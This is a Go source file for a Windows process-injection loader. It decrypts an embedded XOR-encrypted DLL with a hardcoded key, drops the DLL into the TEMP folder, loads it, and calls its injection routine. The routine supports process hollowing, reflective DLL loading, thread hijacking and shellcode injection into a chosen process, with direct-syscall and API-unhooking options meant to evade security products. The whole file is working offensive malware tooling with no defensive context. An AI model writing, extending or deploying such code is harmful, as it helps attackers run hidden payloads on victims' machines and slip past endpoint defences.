package main

import (
	_ "embed"
	"fmt"
	"os"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"
)

//go:embed libjockey.enc
var jockeyEncrypted []byte

var xorKey = []byte{
	0x9A, 0x7C, 0x31, 0xEE, 0x42, 0xBB, 0x5D, 0x10,
	0x88, 0x03, 0x6F, 0xA4, 0xD2, 0x55, 0x19, 0xC7,
	0x3F, 0x81, 0x6E, 0xB0, 0x2C, 0x74, 0x95, 0x4A,
	0xE1, 0x08, 0x57, 0xDF, 0x66, 0x2B, 0x9C, 0x13,
}

var (
	jockeyDLL  *syscall.LazyDLL
	procInject *syscall.LazyProc
)

type InjectionConfig struct {
	Method            int32
	TargetPid         uint32
	TargetImage       uintptr
	Payload           uintptr
	PayloadSize       uintptr
	PayloadPath       uintptr
	UseDirectSyscalls int32
	UnhookApi         int32
	_pad              [4]byte
}

type InjectionResult struct {
	Success bool
	Code    int
	Message string
}

func decryptDLL() []byte {
	out := make([]byte, len(jockeyEncrypted))
	for i := range jockeyEncrypted {
		out[i] = jockeyEncrypted[i] ^ xorKey[i%32]
	}
	return out
}

func loadEngine() error {
	plain := decryptDLL()
	name := fmt.Sprintf("tmp_%d.dll", time.Now().UnixNano())
	path := filepath.Join(os.Getenv("TEMP"), name)
	if err := os.WriteFile(path, plain, 0755); err != nil {
		return fmt.Errorf("write dll: %w", err)
	}
	jockeyDLL = syscall.NewLazyDLL(path)
	if err := jockeyDLL.Load(); err != nil {
		return fmt.Errorf("load: %w", err)
	}
	procInject = jockeyDLL.NewProc("inject_process")
	if err := procInject.Find(); err != nil {
		return fmt.Errorf("inject_process not exported: %w", err)
	}
	return nil
}

func InitializeEngine() {
	if err := loadEngine(); err != nil {
		fmt.Fprintf(os.Stderr, "[FATAL] engine: %v\n", err)
		os.Exit(1)
	}
	fmt.Println("[+] Execution Engine ready.")
}

func InjectPayload(action string, targetPid uint32, targetImage string, payload []byte, useSyscalls, unhook bool) InjectionResult {
	var method int32
	switch action {
	case "hollow":
		method = 1
	case "reflect":
		method = 2
	case "hijack":
		method = 3
	case "shellcode":
		method = 4
	default:
		return InjectionResult{false, -2, fmt.Sprintf("unknown action: %s", action)}
	}

	var cImage uintptr
	if targetImage != "" {
		p, err := syscall.BytePtrFromString(targetImage)
		if err != nil {
			return InjectionResult{false, -3, fmt.Sprintf("cstring: %v", err)}
		}
		cImage = uintptr(unsafe.Pointer(p))
	}

	var payloadPtr uintptr
	var payBuf []byte
	if len(payload) > 0 {
		payBuf = make([]byte, len(payload))
		copy(payBuf, payload)
		payloadPtr = uintptr(unsafe.Pointer(&payBuf[0]))
	}

	var u, h int32
	if useSyscalls {
		u = 1
	}
	if unhook {
		h = 1
	}

	cfg := InjectionConfig{
		Method:            method,
		TargetPid:         targetPid,
		TargetImage:       cImage,
		Payload:           payloadPtr,
		PayloadSize:       uintptr(len(payload)),
		UseDirectSyscalls: u,
		UnhookApi:         h,
	}

	r, _, _ := procInject.Call(uintptr(unsafe.Pointer(&cfg)))
	_ = payBuf

	if int32(r) == 0 {
		return InjectionResult{true, 0, "Injection succeeded"}
	}
	return InjectionResult{false, int(r), fmt.Sprintf("Injection failed: %d", int(r))}
}